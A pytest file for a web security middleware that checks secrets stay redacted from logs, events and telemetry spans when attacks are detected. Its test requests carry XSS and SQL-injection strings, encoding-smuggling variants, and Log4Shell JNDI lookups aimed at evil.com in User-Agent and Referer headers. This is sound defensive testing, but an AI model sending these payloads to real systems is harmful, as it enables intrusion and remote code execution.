import json
import logging
import re
from collections.abc import Callable, Iterator
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch
from urllib.parse import quote, quote_plus, urlencode

import pytest

from guard_core.models import DynamicRules, SecurityConfig
from guard_core.sync._utils.detection_scan import _json_depth_cap_value
from guard_core.sync.core.behavioral.context import BehavioralContext
from guard_core.sync.core.behavioral.processor import BehavioralProcessor
from guard_core.sync.core.bypass.context import BypassContext
from guard_core.sync.core.bypass.handler import BypassHandler
from guard_core.sync.core.checks import build_default_pipeline
from guard_core.sync.core.events.logfire_handler import LogfireHandler
from guard_core.sync.core.events.metrics import MetricsCollector
from guard_core.sync.core.events.middleware_events import SecurityEventBus
from guard_core.sync.core.events.otel_handler import OtelHandler
from guard_core.sync.core.validation.context import ValidationContext
from guard_core.sync.core.validation.validator import RequestValidator
from guard_core.sync.decorators.base import BaseSecurityDecorator, RouteConfig
from guard_core.sync.handlers._dynamic_rule_snapshot import DynamicRuleSnapshotMixin
from guard_core.sync.handlers.behavior_handler import BehaviorRule, BehaviorTracker
from guard_core.sync.handlers.ipban_handler import ip_ban_manager
from guard_core.sync.handlers.ratelimit_handler import RateLimitManager
from guard_core.sync.handlers.security_headers_handler import security_headers_manager
from guard_core.sync.handlers.suspatterns_handler import sus_patterns_handler
from guard_core.sync.protocols.request_protocol import SyncGuardRequest
from guard_core.sync.utils import (
    detect_penetration_attempt,
    extract_client_ip,
    log_activity,
)
from tests.test_sync.conftest import MockGuardResponse, SyncMockGuardRequest

try:
    from opentelemetry.sdk.trace import TracerProvider
    from opentelemetry.sdk.trace.export import SimpleSpanProcessor
    from opentelemetry.sdk.trace.export.in_memory_span_exporter import (
        InMemorySpanExporter,
    )

    _otel_sdk_available = True
except ImportError:
    TracerProvider = None
    SimpleSpanProcessor = None
    InMemorySpanExporter = None
    _otel_sdk_available = False

_XSS = "<script>alert(1)</script>"
_SQLI = "' OR 1=1--"
_CONTENT_TYPE_MULTIPART = "multipart/form-data; boundary=B0"
_CUSTOM_SENSITIVE_HEADER = "x-custom-secret-header"
_CUSTOM_SENSITIVE_PARAM = "custom-secret-param"
_CUSTOM_SENSITIVE_BODY_FIELD = "custom_secret_field"
_PIPELINE_CLIENT_IP = "203.0.113.77"

_ON_BLOCK_CALLS: list[dict[str, Any]] = []
_ON_ERROR_CALLS: list[tuple[str, BaseException, dict[str, Any]]] = []
_LOGFIRE_CALLS: list[dict[str, Any]] = []


def _record_on_block(request: SyncGuardRequest, payload: dict[str, Any]) -> None:
    _ON_BLOCK_CALLS.append(payload)


def _record_on_error(stage: str, exc: BaseException, context: dict[str, Any]) -> None:
    _ON_ERROR_CALLS.append((stage, exc, dict(context)))


class _NullSpan:
    def __enter__(self) -> None:
        return None

    def __exit__(self, *exc_info: object) -> None:
        return None


def _record_logfire_span(name: str, **kwargs: Any) -> _NullSpan:
    _LOGFIRE_CALLS.append({"span": name, **kwargs})
    return _NullSpan()


def _record_logfire_info(name: str, **kwargs: Any) -> None:
    _LOGFIRE_CALLS.append({"info": name, **kwargs})


@pytest.fixture(autouse=True)
def _wire_logfire() -> Iterator[None]:
    with (
        patch("guard_core.sync.core.events.logfire_handler._logfire_available", True),
        patch("guard_core.sync.core.events.logfire_handler.logfire") as mock_logfire,
    ):
        mock_logfire.span.side_effect = _record_logfire_span
        mock_logfire.info.side_effect = _record_logfire_info
        yield


def _build_config(**overrides: Any) -> SecurityConfig:
    base: dict[str, Any] = {
        "log_sensitive_headers": {_CUSTOM_SENSITIVE_HEADER},
        "log_sensitive_params": {_CUSTOM_SENSITIVE_PARAM},
        "log_sensitive_body_fields": {_CUSTOM_SENSITIVE_BODY_FIELD},
        "enable_ip_banning": False,
        "passive_mode": False,
        "on_block": _record_on_block,
        "on_error": _record_on_error,
    }
    base.update(overrides)
    return SecurityConfig(**base)


def _build_otel_handler(config: SecurityConfig) -> Any:
    if not _otel_sdk_available or InMemorySpanExporter is None:
        return None
    handler = OtelHandler(config)
    provider = TracerProvider()
    provider.add_span_processor(SimpleSpanProcessor(_SPAN_EXPORTER))
    handler._tracer = provider.get_tracer("guard_core.otel")
    return handler


class _RecordingAgentHandler:
    def __init__(self, forward_to: list[Any] | None = None) -> None:
        self.events: list[Any] = []
        self.metrics: list[Any] = []
        self._forward_to = forward_to or []

    def send_event(self, event: Any) -> None:
        self.events.append(event)
        for target in self._forward_to:
            target.send_event(event)

    def send_metric(self, metric: Any) -> None:
        self.metrics.append(metric)
        for target in self._forward_to:
            if hasattr(target, "send_metric"):
                target.send_metric(metric)

    def initialize_redis(self, _redis_handler: Any) -> None:
        return None

    def start(self) -> None:
        return None

    def stop(self) -> None:
        return None

    def flush_buffer(self) -> None:
        return None

    def get_dynamic_rules(self) -> Any | None:
        return None

    def health_check(self) -> bool:
        return True


def _build_middleware(config: SecurityConfig) -> MagicMock:
    middleware = MagicMock()
    middleware.config = config
    middleware.logger = logging.getLogger("guard_core.test.sensitive_invariant")
    middleware.event_bus = SecurityEventBus(
        agent_handler=_AGENT_RECORDER, config=config, geo_ip_handler=None
    )
    middleware.create_error_response = MagicMock(
        return_value=MagicMock(status_code=400)
    )
    middleware.route_resolver = MagicMock()
    middleware.route_resolver.should_bypass_check = MagicMock(return_value=False)
    middleware.route_resolver.get_route_config = MagicMock(return_value=None)
    middleware.route_resolver.get_cloud_providers_to_check = MagicMock(
        return_value=None
    )
    middleware.geo_ip_handler = None
    middleware.suspicious_request_counts = {}
    middleware.guard_decorator = None
    middleware.agent_handler = _AGENT_RECORDER
    middleware.last_cloud_ip_refresh = 0
    middleware.refresh_cloud_ip_ranges = MagicMock(return_value=None)
    middleware.rate_limit_handler = RateLimitManager(config)
    middleware.response_factory = MagicMock()
    middleware.response_factory.apply_modifier = MagicMock(side_effect=lambda r: r)
    return middleware


def _scenario_config(**overrides: Any) -> SecurityConfig:
    return _build_config(**overrides)


def _scenario_middleware(
    config: SecurityConfig,
    *,
    route_config: RouteConfig | None = None,
    geo_ip_handler: Any = None,
) -> MagicMock:
    middleware = MagicMock()
    middleware.config = config
    middleware.logger = logging.getLogger(
        "guard_core.test.sensitive_invariant.component"
    )
    middleware.event_bus = SecurityEventBus(
        agent_handler=_AGENT_RECORDER, config=config, geo_ip_handler=geo_ip_handler
    )
    middleware.create_error_response = MagicMock(
        side_effect=lambda status_code, default_message: MockGuardResponse(
            default_message, status_code
        )
    )
    middleware.route_resolver = MagicMock()
    middleware.route_resolver.get_route_config = MagicMock(return_value=route_config)
    middleware.route_resolver.should_bypass_check = MagicMock(return_value=False)
    middleware.route_resolver.get_cloud_providers_to_check = MagicMock(
        return_value=None
    )
    middleware.geo_ip_handler = geo_ip_handler
    middleware.agent_handler = _AGENT_RECORDER
    middleware.suspicious_request_counts = {}
    middleware.last_cloud_ip_refresh = 0
    middleware.refresh_cloud_ip_ranges = MagicMock(return_value=None)
    middleware.rate_limit_handler = RateLimitManager(config)
    middleware.rate_limit_handler.agent_handler = _AGENT_RECORDER
    middleware.response_factory = MagicMock()
    middleware.response_factory.apply_modifier = MagicMock(side_effect=lambda r: r)
    middleware.guard_decorator = None
    return middleware


_SPAN_EXPORTER: Any = InMemorySpanExporter() if _otel_sdk_available else None
_CONFIG = _build_config()
_OTEL_HANDLER = _build_otel_handler(_CONFIG)
_LOGFIRE_HANDLER = LogfireHandler(_CONFIG)
_AGENT_RECORDER = _RecordingAgentHandler(
    forward_to=[h for h in (_OTEL_HANDLER, _LOGFIRE_HANDLER) if h is not None]
)
_MIDDLEWARE = _build_middleware(_CONFIG)
_PIPELINE = build_default_pipeline(_MIDDLEWARE)


class _UserinfoPasswordRequest(SyncMockGuardRequest):
    def __init__(self, *, password: str, **kwargs: Any) -> None:
        super().__init__(**kwargs)
        self._userinfo_password = password

    @property
    def url_full(self) -> str:
        return f"{self.url_scheme}://user:{self._userinfo_password}@test{self.url_path}"


def _header_request(name: str, value: str) -> SyncMockGuardRequest:
    return SyncMockGuardRequest(headers={name: value})


def _query_request(name: str, value: str) -> SyncMockGuardRequest:
    return SyncMockGuardRequest(query_params={name: value})


def _path_request(path: str) -> SyncMockGuardRequest:
    return SyncMockGuardRequest(path=path)


def _userinfo_request(password: str) -> SyncMockGuardRequest:
    return _UserinfoPasswordRequest(password=password, query_params={"trigger": _XSS})


def _json_body_request(body: bytes) -> SyncMockGuardRequest:
    return SyncMockGuardRequest(
        method="POST",
        client_host="127.0.0.1",
        body_content=body,
        headers={
            "content-type": "application/json",
            "content-length": str(len(body)),
        },
    )


def _form_body_request(fields: dict[str, str]) -> SyncMockGuardRequest:
    body = urlencode(fields).encode()
    return SyncMockGuardRequest(
        method="POST",
        client_host="127.0.0.1",
        body_content=body,
        headers={
            "content-type": "application/x-www-form-urlencoded",
            "content-length": str(len(body)),
        },
    )


def _text_field_body(name: str, value: str) -> bytes:
    return (
        f'--B0\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n'
        f"{value}\r\n--B0--\r\n"
    ).encode()


def _multipart_body_request(name: str, value: str) -> SyncMockGuardRequest:
    body = _text_field_body(name, value)
    return SyncMockGuardRequest(
        method="POST",
        client_host="127.0.0.1",
        body_content=body,
        headers={
            "content-type": _CONTENT_TYPE_MULTIPART,
            "content-length": str(len(body)),
        },
    )


def _file_field_body(name: str, filename: str) -> bytes:
    return (
        f'--B0\r\nContent-Disposition: form-data; name="{name}"; '
        f'filename="{filename}"\r\n\r\nbinary-content\r\n--B0--\r\n'
    ).encode()


def _multipart_filename_body_request(name: str, filename: str) -> SyncMockGuardRequest:
    body = _file_field_body(name, filename)
    return SyncMockGuardRequest(
        method="POST",
        client_host="127.0.0.1",
        body_content=body,
        headers={
            "content-type": _CONTENT_TYPE_MULTIPART,
            "content-length": str(len(body)),
        },
    )


def _nested_wrapper_body(depth: int, wrapper_key: str, leaf: dict[str, str]) -> bytes:
    leaf_json = json.dumps(leaf)
    prefix = f'{{"{wrapper_key}":' * depth
    suffix = "}" * depth
    return (prefix + leaf_json + suffix).encode()


def _plain_pair(secret: str) -> str:
    return f"token={secret} {_XSS}"


def _pct_encode_pair(secret: str, rounds: int) -> str:
    value = f"{secret} {_XSS}"
    for _ in range(rounds):
        value = quote(value, safe="")
    return f"token={value}"


def _plus_for_space_pair(secret: str) -> str:
    return f"token={quote_plus(f'{secret} {_XSS}')}"


def _pct_equals_pair(secret: str) -> str:
    value = quote(f"{secret} {_XSS}", safe="")
    return f"token%3D{value}"


def _pct_amp_smuggle_pair(secret: str) -> str:
    raw_pair = f"token={secret} {_XSS}&y=2"
    return quote(raw_pair, safe="")


def _semicolon_pair(secret: str) -> str:
    return f"x=1;token={secret} {_XSS}"


def _uppercase_name_pair(secret: str) -> str:
    return f"TOKEN={secret} {_XSS}"


def _pct_encoded_name_pair(secret: str) -> str:
    encoded_name = "".join(f"%{ord(c):02X}" for c in "token")
    return f"{encoded_name}={secret} {_XSS}"


def _comma_pair(secret: str) -> str:
    return f"a=1,token={secret} {_XSS}"


def _pct_space_before_equals_name_pair(secret: str) -> str:
    return f"token%20={secret} {_XSS}"


def _encoded_query_path_request(query_string: str) -> SyncMockGuardRequest:
    return _path_request(f"/resource?{query_string}")


def _oversized_json_pair_value(secret: str) -> str:
    padding = "a" * 20000
    body = json.dumps({"padding": padding, "password": f"{secret} {_XSS}"})
    return f"x={body}"


def _form_field_oversized_json_request(secret: str) -> SyncMockGuardRequest:
    return _form_body_request({"data": _oversized_json_pair_value(secret)})


def _header_oversized_json_request(secret: str) -> SyncMockGuardRequest:
    return _header_request("X-Info", _oversized_json_pair_value(secret))


class _BoundedBodyRequest(SyncMockGuardRequest):
    def read_body_prefix(self, max_bytes: int) -> bytes:
        return (self._body or b"")[:max_bytes]


def _read_cap_straddled_json_body_request(secret: str) -> SyncMockGuardRequest:
    cap = _CONFIG.detection_max_body_inspect_bytes
    prefix = f'{{"padding":"{_XSS} '
    key = '","password":"'
    visible_before_cut = 20
    padding_len = cap - len(prefix) - len(key) - visible_before_cut
    tail = f'{secret}"}}'
    body_text = prefix + ("a" * padding_len) + key + tail
    body = body_text.encode()
    return _BoundedBodyRequest(
        method="POST",
        client_host="127.0.0.1",
        body_content=body,
        headers={
            "content-type": "application/json",
            "content-length": str(len(body)),
        },
    )


def _header_quoted_name_xss_request(secret: str) -> SyncMockGuardRequest:
    return _header_request("X-Info", f'"password":"{secret}" {_XSS}')


def _query_param_name_encoded_five_times_pair(secret: str) -> str:
    encoded_name = "token"
    for _ in range(5):
        encoded_name = quote_plus(encoded_name)
    return f"{encoded_name}={secret} {_XSS}"


def _query_string_header_set_name_pair(secret: str) -> str:
    return f"authorization={secret} {_XSS}"


def _fragment_header_set_name_request(secret: str) -> SyncMockGuardRequest:
    return _path_request(f"/route#authorization={secret} {_XSS}")


def _path_segment_header_set_name_request(secret: str) -> SyncMockGuardRequest:
    return _path_request(f"/authorization={secret} {_XSS}")


def _header_value_header_set_name_request(secret: str) -> SyncMockGuardRequest:
    return _header_request("X-Session", f"authorization={secret} {_XSS}")


def _path_segment_bare_pair_plain_request(secret: str) -> SyncMockGuardRequest:
    return _path_request(f"/password={secret} {_XSS}")


def _path_segment_bare_pair_pct_encoded_request(secret: str) -> SyncMockGuardRequest:
    pair = quote(f"password={secret} {_XSS}", safe="")
    return _path_request(f"/{pair}")


@dataclass(frozen=True)
class Case:
    id: str
    request_factory: Callable[[str], SyncMockGuardRequest]


_CASES: list[Case] = [
    Case(
        "header_default_sensitive_name_direct_value",
        lambda secret: _header_request("Authorization", f"{secret} {_XSS}"),
    ),
    Case(
        "header_custom_sensitive_name_direct_value",
        lambda secret: _header_request(_CUSTOM_SENSITIVE_HEADER, f"{secret} {_XSS}"),
    ),
    Case(
        "header_non_sensitive_name_json_secret_under_sensitive_key",
        lambda secret: _header_request(
            "X-Info", json.dumps({"password": f"{secret} {_XSS}"})
        ),
    ),
    Case(
        "query_param_default_sensitive_name_direct_value",
        lambda secret: _query_request("token", f"{secret} {_SQLI}"),
    ),
    Case(
        "query_param_custom_sensitive_name_direct_value",
        lambda secret: _query_request(_CUSTOM_SENSITIVE_PARAM, f"{secret} {_SQLI}"),
    ),
    Case(
        "query_param_non_sensitive_name_json_secret_under_sensitive_key",
        lambda secret: _query_request(
            "data", json.dumps({"password": f"{secret} {_SQLI}"})
        ),
    ),
    Case(
        "path_segment_whole_path_is_json_secret_under_sensitive_key",
        lambda secret: _path_request(
            "/" + json.dumps({"password": f"{secret} {_XSS}"})
        ),
    ),
    Case(
        "path_segment_matrix_param_token",
        lambda secret: _path_request(f"/resource;token={secret} {_XSS}"),
    ),
    Case(
        "fragment_token_equals_value",
        lambda secret: _path_request(f"/route#token={secret} {_XSS}"),
    ),
    Case(
        "fragment_hash_route_question_token",
        lambda secret: _path_request(f"/route#/nested?token={secret} {_XSS}"),
    ),
    Case(
        "fragment_hash_a_equals_1_question_token",
        lambda secret: _path_request(f"/route#a=1?token={secret} {_XSS}"),
    ),
    Case(
        "userinfo_password_redacted_with_companion_trigger",
        lambda secret: _userinfo_request(secret),
    ),
    Case(
        "json_body_top_level_sensitive_key",
        lambda secret: _json_body_request(
            json.dumps({"password": f"{secret} {_SQLI}"}).encode()
        ),
    ),
    Case(
        "json_body_nested_three_levels_sensitive_key",
        lambda secret: _json_body_request(
            json.dumps({"a": {"b": {"password": f"{secret} {_SQLI}"}}}).encode()
        ),
    ),
    Case(
        "json_body_array_of_objects_sensitive_key",
        lambda secret: _json_body_request(
            json.dumps([{"note": "benign"}, {"password": f"{secret} {_SQLI}"}]).encode()
        ),
    ),
    Case(
        "json_body_sensitive_key_wraps_object_value",
        lambda secret: _json_body_request(
            json.dumps({"password": {"inner": f"{secret} {_SQLI}"}}).encode()
        ),
    ),
    Case(
        "json_body_sensitive_leaf_deeper_than_max_json_depth_under_non_sensitive_wrapper",
        lambda secret: _json_body_request(
            _nested_wrapper_body(
                _json_depth_cap_value(), "wrapper", {"password": f"{secret} {_SQLI}"}
            )
        ),
    ),
    Case(
        "form_body_default_sensitive_field_name",
        lambda secret: _form_body_request({"password": f"{secret} {_SQLI}"}),
    ),
    Case(
        "form_body_custom_sensitive_field_name",
        lambda secret: _form_body_request(
            {_CUSTOM_SENSITIVE_BODY_FIELD: f"{secret} {_SQLI}"}
        ),
    ),
    Case(
        "multipart_text_part_sensitive_field_name",
        lambda secret: _multipart_body_request("password", f"{secret} {_SQLI}"),
    ),
    Case(
        "header_non_sensitive_name_plain_pair_value",
        lambda secret: _header_request("X-Session", f"password={secret} {_XSS}"),
    ),
    Case(
        "header_non_sensitive_name_cookie_style_pair_value",
        lambda secret: _header_request("X-Session", f"a=1; password={secret} {_XSS}"),
    ),
    Case(
        "query_param_non_sensitive_name_plain_pair_value",
        lambda secret: _query_request("data", f"password={secret} {_XSS}"),
    ),
    Case(
        "form_body_non_sensitive_field_name_plain_pair_value",
        lambda secret: _form_body_request({"note": f"password={secret} {_SQLI}"}),
    ),
    Case(
        "multipart_text_part_non_sensitive_field_name_plain_pair_value",
        lambda secret: _multipart_body_request("note", f"password={secret} {_SQLI}"),
    ),
    Case(
        "json_body_non_sensitive_key_plain_pair_in_string_value",
        lambda secret: _json_body_request(
            json.dumps({"note": f"password={secret} {_SQLI}"}).encode()
        ),
    ),
    Case(
        "url_encoding_plain",
        lambda secret: _encoded_query_path_request(_plain_pair(secret)),
    ),
    Case(
        "url_encoding_percent_encoded_once",
        lambda secret: _encoded_query_path_request(_pct_encode_pair(secret, 1)),
    ),
    Case(
        "url_encoding_percent_encoded_twice",
        lambda secret: _encoded_query_path_request(_pct_encode_pair(secret, 2)),
    ),
    Case(
        "url_encoding_percent_encoded_three_times",
        lambda secret: _encoded_query_path_request(_pct_encode_pair(secret, 3)),
    ),
    Case(
        "url_encoding_plus_for_space",
        lambda secret: _encoded_query_path_request(_plus_for_space_pair(secret)),
    ),
    Case(
        "url_encoding_percent_encoded_equals_separator",
        lambda secret: _encoded_query_path_request(_pct_equals_pair(secret)),
    ),
    Case(
        "url_encoding_percent_encoded_ampersand_smuggles_second_pair",
        lambda secret: _encoded_query_path_request(_pct_amp_smuggle_pair(secret)),
    ),
    Case(
        "url_encoding_semicolon_pair_separator",
        lambda secret: _encoded_query_path_request(_semicolon_pair(secret)),
    ),
    Case(
        "url_encoding_uppercase_param_name",
        lambda secret: _encoded_query_path_request(_uppercase_name_pair(secret)),
    ),
    Case(
        "url_encoding_percent_encoded_letters_in_param_name",
        lambda secret: _encoded_query_path_request(_pct_encoded_name_pair(secret)),
    ),
    Case(
        "size_query_param_value_over_100_chars_never_partially_leaks",
        lambda secret: _query_request("token", f"{secret}{'X' * 150} {_SQLI}"),
    ),
    Case(
        "size_json_body_300_level_nested_wrapper_must_not_raise",
        lambda secret: _json_body_request(
            _nested_wrapper_body(300, "wrapper", {"password": f"{secret} {_SQLI}"})
        ),
    ),
    Case(
        "header_non_sensitive_name_comma_separated_pair_value",
        lambda secret: _header_request("X-Session", f"a=1,password={secret} {_XSS}"),
    ),
    Case(
        "query_param_non_sensitive_name_comma_separated_pair_value",
        lambda secret: _query_request("data", f"a=1,password={secret} {_XSS}"),
    ),
    Case(
        "form_body_non_sensitive_field_name_comma_separated_pair_value",
        lambda secret: _form_body_request({"note": f"a=1,password={secret} {_SQLI}"}),
    ),
    Case(
        "multipart_text_part_non_sensitive_field_name_comma_separated_pair_value",
        lambda secret: _multipart_body_request(
            "note", f"a=1,password={secret} {_SQLI}"
        ),
    ),
    Case(
        "json_body_non_sensitive_key_comma_separated_pair_in_string_value",
        lambda secret: _json_body_request(
            json.dumps({"note": f"a=1,password={secret} {_SQLI}"}).encode()
        ),
    ),
    Case(
        "url_encoding_comma_pair_separator",
        lambda secret: _encoded_query_path_request(_comma_pair(secret)),
    ),
    Case(
        "header_non_sensitive_name_space_before_equals_pair_value",
        lambda secret: _header_request("X-Session", f"password ={secret} {_XSS}"),
    ),
    Case(
        "query_param_non_sensitive_name_space_before_equals_pair_value",
        lambda secret: _query_request("data", f"password ={secret} {_XSS}"),
    ),
    Case(
        "form_body_non_sensitive_field_name_space_before_equals_pair_value",
        lambda secret: _form_body_request({"note": f"password ={secret} {_SQLI}"}),
    ),
    Case(
        "url_encoding_percent_encoded_space_before_equals_in_name",
        lambda secret: _encoded_query_path_request(
            _pct_space_before_equals_name_pair(secret)
        ),
    ),
    Case(
        "header_non_sensitive_name_space_both_sides_equals_pair_value",
        lambda secret: _header_request("X-Session", f"password = {secret} {_XSS}"),
    ),
    Case(
        "json_body_depth_capped_non_sensitive_leaf_plain_pair_in_string_value",
        lambda secret: _json_body_request(
            _nested_wrapper_body(
                _json_depth_cap_value(),
                "wrapper",
                {"note": f"password={secret} {_SQLI}"},
            )
        ),
    ),
    Case(
        "header_non_sensitive_name_json_non_sensitive_key_plain_pair_in_string_value",
        lambda secret: _header_request(
            "X-Info", json.dumps({"note": f"password={secret} {_XSS}"})
        ),
    ),
    Case(
        "query_param_non_sensitive_name_json_non_sensitive_key_plain_pair_in_string_value",
        lambda secret: _query_request(
            "data", json.dumps({"note": f"password={secret} {_SQLI}"})
        ),
    ),
    Case(
        "user_agent_log4shell_with_plain_pair",
        lambda secret: _header_request(
            "User-Agent", f"password={secret} ${{jndi:ldap://evil.com/a}}"
        ),
    ),
    Case(
        "referer_log4shell_with_plain_pair",
        lambda secret: _header_request(
            "Referer", f"password={secret} ${{jndi:ldap://evil.com/a}}"
        ),
    ),
    Case(
        "multipart_filename_plain_pair_value",
        lambda secret: _multipart_filename_body_request(
            "upload", f"password={secret} {_XSS}"
        ),
    ),
    Case(
        "header_non_sensitive_name_nested_pair_value",
        lambda secret: _header_request("X-Session", f"data=password={secret} {_XSS}"),
    ),
    Case(
        "query_param_non_sensitive_name_nested_pair_value",
        lambda secret: _query_request("q", f"data=password={secret} {_XSS}"),
    ),
    Case(
        "form_field_oversized_json_sensitive_key_past_16kb_cutoff",
        _form_field_oversized_json_request,
    ),
    Case(
        "header_oversized_json_sensitive_key_past_16kb_cutoff",
        _header_oversized_json_request,
    ),
    Case(
        "json_body_cut_at_read_cap_sensitive_key_near_cut",
        _read_cap_straddled_json_body_request,
    ),
    Case(
        "header_quoted_name_value_with_trailing_xss",
        _header_quoted_name_xss_request,
    ),
    Case(
        "query_param_sensitive_name_encoded_five_times",
        lambda secret: _encoded_query_path_request(
            _query_param_name_encoded_five_times_pair(secret)
        ),
    ),
    Case(
        "url_query_string_header_set_name_as_pair_name",
        lambda secret: _encoded_query_path_request(
            _query_string_header_set_name_pair(secret)
        ),
    ),
    Case(
        "url_fragment_header_set_name_as_pair_name",
        _fragment_header_set_name_request,
    ),
    Case(
        "url_path_segment_header_set_name_as_pair_name",
        _path_segment_header_set_name_request,
    ),
    Case(
        "header_value_header_set_name_as_pair_name",
        _header_value_header_set_name_request,
    ),
    Case(
        "url_path_segment_bare_pair_plain",
        _path_segment_bare_pair_plain_request,
    ),
    Case(
        "url_path_segment_bare_pair_percent_encoded",
        _path_segment_bare_pair_pct_encoded_request,
    ),
    Case(
        "url_query_string_doubled_triple_encoded_equals_assign_run",
        lambda secret: _encoded_query_path_request(
            f"x%25253D1;PASSWORD%25253D%25253D '{secret} {_XSS}';y%25253D2"
        ),
    ),
    Case(
        "matrix_param_colon_space_assign_inside_json_leaf_string",
        lambda secret: _path_request(
            f'/resource;{{"note": "x=1%2CAcCeSs_tOkEn: \\"{secret} {_XSS}\\"%2Cy=2"}}'
        ),
    ),
    Case(
        "header_tab_before_triple_encoded_equals_assign_run",
        lambda secret: _header_request(
            "X-Session", f"X-CuStOm-sEcReT-HeAdEr\t%25253D'{secret} {_XSS}'"
        ),
    ),
]


def _event_to_dict(event: Any) -> dict[str, Any]:
    if hasattr(event, "model_dump"):
        dumped: dict[str, Any] = event.model_dump(mode="json")
        return dumped
    return dict(vars(event))


def _events_dump(events: list[Any]) -> str:
    return json.dumps([_event_to_dict(event) for event in events], default=str)


def _on_block_dump(calls: list[dict[str, Any]]) -> str:
    return json.dumps(calls, default=str)


def _spans_dump(exporter: Any) -> str:
    spans = exporter.get_finished_spans()
    attrs = [dict(span.attributes or {}) for span in spans]
    return json.dumps(attrs, default=str)


def _on_error_dump(calls: list[tuple[str, BaseException, dict[str, Any]]]) -> str:
    return json.dumps(
        [
            {"stage": stage, "error": str(error), "context": context}
            for stage, error, context in calls
        ],
        default=str,
    )


def _logfire_dump(calls: list[dict[str, Any]]) -> str:
    return json.dumps(calls, default=str)


def _metrics_dump(metrics: list[Any]) -> str:
    return json.dumps([_event_to_dict(metric) for metric in metrics], default=str)


def _assert_secret_absent_everywhere(secret: str, scenario_id: str) -> None:
    events_dump = _events_dump(_AGENT_RECORDER.events)
    assert secret not in events_dump, (
        f"scenario {scenario_id!r} leaked the secret into a SecurityEvent: "
        f"{events_dump!r}"
    )
    metrics_dump = _metrics_dump(_AGENT_RECORDER.metrics)
    assert secret not in metrics_dump, (
        f"scenario {scenario_id!r} leaked the secret into a SecurityMetric: "
        f"{metrics_dump!r}"
    )
    on_block_dump = _on_block_dump(_ON_BLOCK_CALLS)
    assert secret not in on_block_dump, (
        f"scenario {scenario_id!r} leaked the secret into the on_block payload: "
        f"{on_block_dump!r}"
    )
    on_error_dump = _on_error_dump(_ON_ERROR_CALLS)
    assert secret not in on_error_dump, (
        f"scenario {scenario_id!r} leaked the secret into the on_error payload: "
        f"{on_error_dump!r}"
    )
    logfire_dump = _logfire_dump(_LOGFIRE_CALLS)
    assert secret not in logfire_dump, (
        f"scenario {scenario_id!r} leaked the secret into a Logfire call: "
        f"{logfire_dump!r}"
    )
    if _otel_sdk_available and _SPAN_EXPORTER is not None:
        spans_dump = _spans_dump(_SPAN_EXPORTER)
        assert secret not in spans_dump, (
            f"scenario {scenario_id!r} leaked the secret into an OpenTelemetry "
            f"span: {spans_dump!r}"
        )


@pytest.fixture(autouse=True)
def _reset_case_state() -> Iterator[None]:
    _ON_BLOCK_CALLS.clear()
    _ON_ERROR_CALLS.clear()
    _LOGFIRE_CALLS.clear()
    _AGENT_RECORDER.events.clear()
    _AGENT_RECORDER.metrics.clear()
    _MIDDLEWARE.suspicious_request_counts.clear()
    if _otel_sdk_available and _SPAN_EXPORTER is not None:
        _SPAN_EXPORTER.clear()
    sus_patterns_handler.agent_handler = _AGENT_RECORDER
    try:
        yield
    finally:
        sus_patterns_handler.agent_handler = None


def test_case_matrix_has_unique_ids_and_covers_the_full_surface_list() -> None:
    ids = [case.id for case in _CASES]
    assert len(ids) == len(set(ids))
    assert len(_CASES) >= 30


@pytest.mark.parametrize("case", _CASES, ids=lambda case: case.id)
def test_sensitive_value_under_a_sensitive_name_never_reaches_guard_core_output(
    case: Case, caplog: pytest.LogCaptureFixture
) -> None:
    secret = f"SECRET-{case.id}"
    logger = logging.getLogger("guard_core.test.sensitive_invariant.direct")

    with caplog.at_level(logging.DEBUG):
        request = case.request_factory(secret)
        detection_result = detect_penetration_attempt(request, _CONFIG)

        log_activity(
            request,
            logger,
            log_type="request",
            level="INFO",
            sensitive_headers=_CONFIG.log_sensitive_headers,
            sensitive_params=_CONFIG.log_sensitive_params,
            sensitive_body_fields=_CONFIG.log_sensitive_body_fields,
        )
        log_activity(
            request,
            logger,
            log_type="suspicious",
            passive_mode=False,
            reason=f"Suspicious activity detected: {detection_result.trigger_info}",
            trigger_info=detection_result.trigger_info,
            level="WARNING",
            on_block=_record_on_block,
            sensitive_headers=_CONFIG.log_sensitive_headers,
            sensitive_params=_CONFIG.log_sensitive_params,
            sensitive_body_fields=_CONFIG.log_sensitive_body_fields,
        )
        log_activity(
            request,
            logger,
            log_type="suspicious",
            passive_mode=True,
            trigger_info=detection_result.trigger_info,
            level="WARNING",
            on_block=_record_on_block,
            sensitive_headers=_CONFIG.log_sensitive_headers,
            sensitive_params=_CONFIG.log_sensitive_params,
            sensitive_body_fields=_CONFIG.log_sensitive_body_fields,
        )
        log_activity(
            request,
            logger,
            log_type="generic",
            reason=f"Generic event: {detection_result.trigger_info}",
            level="WARNING",
            sensitive_headers=_CONFIG.log_sensitive_headers,
            sensitive_params=_CONFIG.log_sensitive_params,
            sensitive_body_fields=_CONFIG.log_sensitive_body_fields,
        )

        pipeline_request = case.request_factory(secret)
        pipeline_request.state.client_ip = _PIPELINE_CLIENT_IP
        pipeline_request.state.route_config = None
        pipeline_response = _PIPELINE.execute(pipeline_request)

    assert detection_result.is_threat is True, (
        f"case {case.id!r} never triggered detection - proves nothing"
    )
    assert pipeline_response is not None, (
        f"case {case.id!r} never blocked through the pipeline - "
        "on_block assertion would be vacuous"
    )
    assert secret not in caplog.text, (
        f"case {case.id!r} leaked the secret into a log line: {caplog.text!r}"
    )
    _assert_secret_absent_everywhere(secret, case.id)


def _client_ip_for(scenario_id: str) -> str:
    digest = sum(ord(c) for c in scenario_id) % 200 + 1
    return f"203.0.113.{digest}"


def _auth_verifier_reject(request: Any, _credential: str) -> Any:
    return None


class _StreamedResponse(MockGuardResponse):
    def read_body_prefix(self, max_bytes: int) -> bytes:
        body = self.body or b""
        return body[:max_bytes]


class _SnapshotPersistTarget(DynamicRuleSnapshotMixin):
    def __init__(self, config: SecurityConfig) -> None:
        self.config = config
        self.redis_handler = None
        self.logger = logging.getLogger(
            "guard_core.test.sensitive_invariant.dynamic_rules"
        )


def _tri_surface_request(secret: str, client_ip: str) -> SyncMockGuardRequest:
    body = json.dumps({_CUSTOM_SENSITIVE_BODY_FIELD: secret}).encode()
    return SyncMockGuardRequest(
        method="POST",
        client_host=client_ip,
        query_params={_CUSTOM_SENSITIVE_PARAM: secret},
        body_content=body,
        headers={
            _CUSTOM_SENSITIVE_HEADER: secret,
            "content-type": "application/json",
            "content-length": str(len(body)),
        },
    )


